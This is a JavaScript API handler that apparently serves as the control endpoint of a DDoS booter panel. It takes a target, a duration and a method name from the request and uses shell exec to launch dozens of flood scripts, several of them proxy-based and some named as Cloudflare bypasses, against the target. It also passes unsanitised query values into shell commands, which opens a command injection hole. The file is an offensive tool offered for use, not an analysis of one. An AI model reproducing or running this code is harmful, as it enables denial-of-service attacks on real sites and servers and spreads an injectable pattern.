import { exec } from 'child_process';

export default function handler(req, res) {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  switch (methods) {
    case 'ninja':
      exec(`node methods/1.js ${target} ${time}`);
      break;
    case 'mix':
      exec(`node methods/2.js ${target} ${time} 100 10 proxy.txt`);
      break;
    case 'strike':
      exec(`node methods/3.js GET ${target} ${time} 10 90 proxy.txt --full --legit`);
      break;
    case 'kill':
      exec(`node methods/19.js ${target} 9999 Administrator ${time}`);
      exec(`node methods/3 ${target} ${time}`);
      exec(`node methods/14 ${target} ${time}`);
      exec(`node methods/udp ${target} 17091 ${time}`);
      exec(`node methods/starxudp ${target} 17091 ${time}`);
      break;
    case 'tls':
      exec(`node methods/99.js ${target} ${time} 100 10 proxy.txt`);
      break;
    case 'flood':
      exec(`node methods/5.js ${target} ${time} 20 60 proxy.txt`);
      break;
    case 'https':
      exec(`node methods/6.js ${target} ${time} 10 100 proxy.txt`);
      break;
    case 'raw':
    case 'http-raw':
      exec(`node methods/7.js ${target} ${time}`);
      break;
    case 'tlsv2':
      exec(`node methods/8.js ${target} ${time} 50 10`);
      break;
    case 'storm':
      exec(`node methods/9.js ${target} ${time} 32 10 proxy.txt`);
      break;
    case 'destroy':
      exec(`node methods/10.js ${target} ${time} 100 10 proxy.txt`);
      break;
    case 'bypass':
      exec(`node methods/11.js ${target} ${time} 100 10 proxy.txt`);
      break;
    case 'glory':
    case 'sigma':
      exec(`node methods/12.js ${target} ${time} 32 10 proxy.txt`);
      break;
    case 'harder':
      exec(`node methods/13.js ${target} ${time} 32 8 proxy.txt`);
      break;
    case 'yeah':
      exec(`node methods/13.js ${target} ${time} 32 10 proxy.txt`);
      break;
    case 'pluto':
      exec(`node methods/14.js ${target} ${time}`);
      break;
    case 'uam':
      exec(`node methods/15.js ${target} ${time} 9 3 proxy.txt`);
      break;
    case 'httpx':
      exec(`node methods/15.js ${target} ${time} 32 8 proxy.txt`);
      break;
    case 'udp':
      exec(`node methods/udp.js ${target} 53 ${time}`);
      break;
    case 'tcp':
      exec(`node methods/1.js ${target}:443 ${time}`);
      break;
    case 'java':
      exec(`node methods/java.js ${target} ${time} 32 4 proxy.txt`);
      break;
    case 'awi':
      exec(`node methods/gojov5.js get ${target} ${time} 32 8 proxy.txt`);
      break;
    case 'cookie':
      exec(`node methods/cookie.js get ${target} ${time} 32 4 proxy.txt`);
      break;
    case 'dstat':
      exec(`node methods/spike.js get ${target} 8 ${time}`);
      break;
    case 'cf':
      exec(`node methods/cf-flood.js ${target} ${time}`);
      exec(`node methods/uambypass.js ${target} ${time} 100 proxy.txt`);
      exec(`node methods/12.js ${target} ${time} 32 10 proxy.txt`);
      exec(`node methods/cookie.js get ${target} ${time} 32 8 proxy.txt`);
      exec(`node methods/tlsop.js get ${target} ${time} 32 10 proxy.txt`);
      break;
    default:
      console.log('Metode tidak dikenali atau format salah.');
  }
}
